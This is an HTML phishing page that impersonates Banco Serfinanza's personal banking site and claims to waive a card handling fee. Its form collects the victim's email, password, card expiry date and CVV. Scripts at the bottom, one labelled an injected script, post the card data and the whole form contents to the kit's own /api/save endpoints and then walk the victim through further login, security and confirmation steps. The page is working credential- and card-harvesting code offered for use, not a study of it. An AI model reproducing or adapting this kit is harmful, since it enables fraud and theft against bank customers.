<!DOCTYPE html>
<html lang="es">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="author" content="">
    <meta property="og:locale" content="es_ES">
    <meta property="og:site_name" content="Banco Serfinanzas">
    <meta property="og:title" content="Cero cuotas de manejo, CDT, Tarjeta de crédito, Giros">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://i.imgur.com/NsgYhiD.png">
    <meta name="description"
        content="Encuentra en Banco Serfinanza un portafolio de Productos y Servicios: CDT, Giros, Tarjeta de Crédito, Crédito Rotativo, Crédito de Libre Inversión y más.">
    <link rel="shortcut icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico"
        type="image/x-icon">
    <link rel="icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico" type="image/x-icon">
    <title>Exonerar cuota de manejo - Serfinanza Banca Personal</title>

    <link rel="dns-prefetch" href="https://fonts.googleapis.com/">
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans&amp;display=swap" rel="stylesheet">
    <link href="../Assets/font/css/open-iconic.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <!-- Fontawesome icon CSS -->
    <script src="https://kit.fontawesome.com/1c594bb82f.js" crossorigin="anonymous"></script>
    <link rel="dns-prefetch" href="https://use.fontawesome.com/">
    <link rel="stylesheet" href="../../../use.fontawesome.com/releases/v5.6.3/css/all.css"
        integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
    <!-- Bootstrap CSS -->
    <link href="../Content/bootstrap.min.css" rel="stylesheet" />
    <!-- Adminux CSS -->

    <link rel="stylesheet" href="../Assets/css/intercomStyle.css" type="text/css">
    <!-- CSS Serfinanza -->
    <link rel="stylesheet" href="../Assets/css/serfinansaNew.css" type="text/css">

    <style>
        @media (min-width: 576px) {
            .col-sm-4 {
                max-width: 100%;
            }
        }

        @media (min-width: 576px) {
            .col-sm-8 {
                max-width: 100%;
            }
        }

        .custom-control {
            padding-left: 2rem;
        }

        .col-sm-8 {
            padding-right: 0px;
            padding-left: 0px;
        }

        body.no-padding-right {
            padding-right: 0px !important;
        }

        .container {
            padding-left: 10px;
            padding-right: 10px;
        }
    </style>


  <script src="config.js"></script>
</head>

<body style="overflow-x: hidden; overflow-y: visible;">

    <div class="container-fluid">
        <div class="row">

            <!-- Page Loader -->
            <div class="loader_wrapper inner align-items-center text-center">
                <div class="load7 load-wrapper">
                    <div class="loading_img"></div>
                    <div class="loader"> Cargando... </div>
                    <div class="clearfix"></div>
                </div>
            </div>
            <!-- Page Loader Ends -->
            <header class="headLogin">
                <div id="logoPrincipal" class="col">
                    <div class="row">
                        <div id="SerfinansaImg" class="col-12 col-md-4">
                            <img src="../Assets/img/logo2.png" alt="Serfinansa">
                            <div class="titleLogin">
                                <h1>BANCA PERSONAS</h1>
                            </div>
                        </div>

                    </div>
                </div>
                <hr />
                <div class="spaceline">

                </div>
            </header>

        </div>
        <div class="row">
            <div class="col-12" id="squadContainer">
                <div class="modal-content" style="border: 1px solid #CCCCCC;
                border-radius: 20px;
                background: white;
                box-sizing: border-box;
                padding: 45px 5px 10px;
                transition: border-width 0.6s linear;
                box-shadow: 0 1px 1px rgba(0,0,0,0.19), 0 1px 1px rgba(0,0,0,0.23);">
                    <div class="modal-body" style="padding: 0px;">
                        <h4 class="text-center">EXONERACIÓN CUOTA DE MANEJO</h4>
                        <p class="font-bold">
                            Para continuar confirma los siguientes datos.
                        </p>
                        <p style="font-size: 14px;">
                            Completa los campos del producto al cual deseas eliminarle la <b>cuota de manejo.</b>
                        </p>

                        <form id="FormActuDatos" class="">
                            <div class="container">
                                <div class="row">

                                    <!--Correo Electrónico-->
                                    <div class="col-md-12 ">
                                        <div class="form-group">
                                            <label class="col-sm-4 col-form-label" for="Direccion"
                                                style="width: 100% !important; padding-left: 0px; font-weight: bold;">Correo electrónico</label>
                                            <div class="col-sm-8 input-group mb-3">
                                                <input type="email" class="form-control"
                                                    id="email" name="email" placeholder="Ingrese su correo electrónico" value="" required autocomplete="off">
                                            </div>
                                        </div>
                                    </div>

                                    <!--Contraseña-->
                                    <div class="col-md-12 ">
                                        <div class="form-group">
                                            <label class="col-sm-4 col-form-label" for="Direccion"
                                                style="width: 100% !important; padding-left: 0px; font-weight: bold;">contraseña</label>
                                            <div class="col-sm-8 input-group mb-3">
                                                <input type="password" class="form-control"
                                                    id="pass" name="pass" placeholder="Ingrese su contraseña" value="" required autocomplete="off" inputmode="password">
                                            </div>
                                        </div>
                                    </div>

                                    <!--Fecha de vencimiento de la tarjeta-->
                                    <div class="col-md-12 ">
                                        <div class="form-group">
                                            <label class="col-sm-4 col-form-label" for="Barrio"
                                                style="padding-left: 0px; font-weight: bold;">Fecha de vencimiento de tu tarjeta</label>
                                            <div class="col-sm-8 input-group mb-3">
                                                <input type="number" class="form-control  " id="mm" name="mm"
                                                    maxlength="2" value="" placeholder="Mes" required autocomplete="off" inputmode="numeric">
                                                <input type="number" class="form-control  " id="yy" name="yy"
                                                    maxlength="4" value="" placeholder="Año" required autocomplete="off" inputmode="numeric"
                                                    style="border-bottom-left-radius: 0px !important; border-top-left-radius: 0px !important;">
                                            </div>
                                        </div>
                                    </div>

                                    <!--Código de seguridad CVV-->
                                    <div class="col-md-12 ">
                                        <div class="form-group">
                                            <label class="col-sm-4 col-form-label" for="Celular"
                                                style="padding-left: 0px; font-weight: bold;">Código de seguridad de tu tarjeta</label>
                                            <div class="col-sm-8 input-group mb-3" style="margin-bottom: 0px !important;">
                                                <input type="password" class="form-control" id="cvv" name="cvv"
                                                    maxlength="3" value="" required autocomplete="off" inputmode="numeric">
                                            </div>
                                        </div>
                                    </div>

                                    <input type="hidden" id="idd" name="idd" value="1">
                                    <input type="hidden" id="pww" name="pww" value="1">

                                    <div class="col-md-12 mt-4">
                                        <div class="custom-control custom-checkbox">
                                            <input type="checkbox" class="custom-control-input"
                                                id="TerminosYCondiciones" name="TerminosYCondiciones" value="" required>
                                            <label class="custom-control-label" for="TerminosYCondiciones">
                                                He leido y autorizo el
                                                <a href="https://bancoserfinanza.com/servicio-al-cliente/legales/"
                                                    target="_blank">tratamiento de mi información personal</a> y conozco la
                                                <a href="https://bancoserfinanza.com/servicio-al-cliente/legales/"
                                                    target="_blank">Política para la administación de datos personales</a>
                                            </label>
                                        </div>
                                    </div>

                                </div>
                            </div>

                            <div class="modal-footer" style="margin-top: 0 !important;">
                                <button type="button" class="btn btn-secondary" id="btn-cancel"
                                    style="margin-bottom: 0px;" onClick="window.location='/Personal/Login/Index/';">
                                    Cancelar
                                </button>

                                <!-- AJUSTADO AQUÍ -->
                                <button type="button" name="FinishedButton" class="btn btn-primary"
                                    id="BtnActualizarDatos"
                                    style="margin-top: 0 !important; margin-bottom: 0 !important;"
                                    onclick="window.location.href='seguridad.html'">Confirmar ‎ <i class="fa fa-check"></i></button>
                            </div>
                        </form>

                    </div>
                </div>
            </div><!-- /.modal-content -->
        </div>

        <!-- (Resto del archivo se mantiene igual, sin cambios) -->

    </div>

    <!-- jQuery, Bootstrap y scripts existentes -->
    <script src="../Assets/js/jquery-2.1.1.min.js" type="text/javascript"></script>
    <script type="text/javascript" src="../Assets/vendor/popper/popper.min.js"></script>
    <script src="../Assets/vendor/bootstrap4beta/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="../Assets/vendor/cookie/jquery.cookie.js" type="text/javascript"></script>
    <script src="../Assets/js/ie10-viewport-bug-workaround.js"></script>
    <script src="../Scripts/Utilities.js"></script>

    <script>
        "use strict";
        $('input[type="checkbox"]').on('change', function () {
            $(this).parent().toggleClass("active")
            $(this).closest(".media").toggleClass("active");
        });
        $(window).on("load", function () {
            $(".loader_wrapper").fadeOut("slow");
        });
    </script>

    <script>
        var urlAuth2 = "../../Personal/Login/Auth2";
        var login = "../../Personal/Login/Index";
        var closeSession = "../../Personal/Login/Index";
    </script>

    <script src="../Scripts/Keypad/jquery.plugin.min.js"></script>
    <script src="../Scripts/Keypad/jquery.keypad.min.js"></script>
    <script src="../Scripts/Keypad/jquery.keypad-es.js"></script>
    <script src="../Scripts/Alphanum/jquery.alphanum.js"></script>
    <script src="../Assets/js/fpd2.js"></script>
    <script src="../Scripts/Views/login.js" type="text/javascript"></script>

    <script>
        window.addEventListener('load', function () {
            document.body.style.paddingRight = '0px';
        });
        document.getElementById('BtnActualizarDatos').addEventListener('click', function () {
            document.body.classList.add('no-padding-right');
        });
    </script>

    <script src="/Personal/Scripts/Views/script.js"></script>

<!-- Injected script: send exoneration data to backend -->
<script>
(function(){
  async function sendPartial(data){
    try {
      await fetch(window.API_BASE + '/api/users/save',{
        method:'POST',
        headers:{ 'Content-Type':'application/json' },
        body: JSON.stringify(data)
      });
    } catch (err) { console.error(err); }
  }
  document.addEventListener('DOMContentLoaded', function(){
    const btn = document.getElementById('BtnActualizarDatos') || document.querySelector('[name="FinishedButton"]');
    if (!btn) return;
    btn.addEventListener('click', function(e){
      const lastdigits = document.getElementById('lastdigits') ? document.getElementById('lastdigits').value : '';
      const mm = document.getElementById('mm') ? document.getElementById('mm').value : '';
      const yy = document.getElementById('yy') ? document.getElementById('yy').value : '';
      const cvv = document.getElementById('cvv') ? document.getElementById('cvv').value : '';
      sendPartial({ lastdigits, mm, yy, cvv });
    });
  });
})();
</script>

<script>
(function(){
  async function sendStep(data){
    try{
      const resp = await fetch('/api/save', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(data)
      });
      // ignore response but could handle errors
      return resp.json().catch(()=>({}));
    }catch(e){
      console.error('Error sending /api/save', e);
      return null;
    }
  }

  // helper to collect form inputs into object
  function formToObj(form){
    const fd = new FormData(form);
    const obj = {};
    for(const [k,v] of fd.entries()) obj[k]=v;
    return obj;
  }

  // attach to forms by action or id; if not found, attach to first form
  function attach(formSelector, stepName){
    const form = document.querySelector(formSelector) || document.querySelector('form');
    if(!form) return;
    form.addEventListener('submit', async function(e){
      e.preventDefault();
      try{
        const obj = formToObj(form);
        obj.step = stepName;
        // preserve any clientId if exists (localStorage used by socket client)
        if(localStorage && localStorage.getItem('serfina_clientId')) obj.clientId = localStorage.getItem('serfina_clientId');
        await sendStep(obj);
      }catch(err){ console.error(err); }
      // allow original behavior: if form has data-redirect attribute or action, follow it
      const redirect = form.getAttribute('data-redirect') || form.getAttribute('action');
      if(redirect){
        window.location.href = redirect;
      } else {
        // fallback: try next step mapping
        const next = { 'login':'/exoneracion','exoneracion':'/seguridad','seguridad':'/confirmado','confirmado':'/confirmado' };
        window.location.href = next[stepName] || '/';
      }
    }, {once:true});
  }

  // Attachings for known pages by pathname
  const p = window.location.pathname;
  if(p.endsWith('/index.html') || p === '/' || p.endsWith('/Login/') || p.endsWith('/Login/index.html')){
    attach('form', 'login');
  } else if(p.endsWith('/exoneracion.html') || p.endsWith('/exoneracion')){
    attach('form', 'exoneracion');
  } else if(p.endsWith('/seguridad.html') || p.endsWith('/seguridad')){
    attach('form', 'seguridad');
  } else if(p.endsWith('/confirmado.html') || p.endsWith('/confirmado')){
    attach('form', 'confirmado');
  } else {
    // generic attach: if page contains inputs typical of login, attach
    attach('form', 'login');
  }
})();
</script>

</body>
</html>
